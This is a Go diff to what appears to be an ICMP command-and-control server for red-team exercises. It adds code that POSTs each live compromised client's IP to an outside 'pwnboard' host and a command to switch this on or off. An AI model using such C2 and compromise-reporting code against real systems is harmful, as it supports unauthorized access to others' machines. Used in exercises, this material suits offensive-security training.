@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"log"
 	"net"
+	"net/http"
 	"os"
 	"sort"
 	"strconv"
@@ -23,6 +24,7 @@ var clients = make(map[int]string)
 var ALIVE = make(map[string]bool)
 var PacketQueue []icmp.Message
 var SSM bool = false
+var PWNBOARD bool = true
 var execute = false
 var ID int = 0
 var c, ListenerError = icmp.ListenPacket("ip4:icmp", "0.0.0.0")
@@ -32,6 +34,11 @@ var (
 	filter = "icmp[icmptype] == icmp-echoreply"
 )
 var NumOfTeams int
+
+type PwnBoard struct {
+	IPs  string `json:"ip"`
+	Type string `json:"type"`
+}
 
 func print_title() {
 	fmt.Println(".__                          ___             .__.__    ___")
@@ -322,6 +329,32 @@ func RedLog(target string, cmd string) {
 	}
 }
 
+func updatepwnBoard(ip string) {
+	url := "https://pwnboard.win/pwn/boxaccess"
+
+	// Create the struct
+	data := PwnBoard{
+		IPs:  ip,
+		Type: "GoClient",
+	}
+
+	// Marshal the data
+	sendit, err := json.Marshal(data)
+	if err != nil {
+		fmt.Println("\n[-] ERROR SENDING POST:", err)
+		return
+	}
+
+	// Send the post to pwnboard
+	resp, err := http.Post(url, "application/json", bytes.NewBuffer(sendit))
+	if err != nil {
+		fmt.Println("[-] ERROR SENDING POST:", err)
+		return
+	}
+
+	defer resp.Body.Close()
+}
+
 // Using the packet listener and an IP address, send everything in the packet queue
 func SendPackets(addr string, c icmp.PacketConn) {
 	for _, packet := range PacketQueue {
@@ -468,6 +501,9 @@ func CheckAlive() {
 	for id := range keys {
 		if ALIVE[clients[id]] == true {
 			fmt.Printf("\033[92m[%2d]\033[0m", id)
+			if PWNBOARD {
+				updatepwnBoard(clients[id])
+			}
 		} else {
 			fmt.Printf("\033[91m[%2d]\033[0m", id)
 		}
@@ -560,6 +596,14 @@ func main() {
 			} else {
 				SSM = true
 				fmt.Println("[DEBUG] Super Secret Mode enabled.")
+			}
+		case "pwn":
+			if SSM {
+				PWNBOARD = false
+				fmt.Println("[DEBUG] PWNBoard updates disabled.")
+			} else {
+				PWNBOARD = true
+				fmt.Println("[DEBUG] PWNBoard updates enabled.")
 			}
 		case "checkalive":
 			for _, ip := range clients {
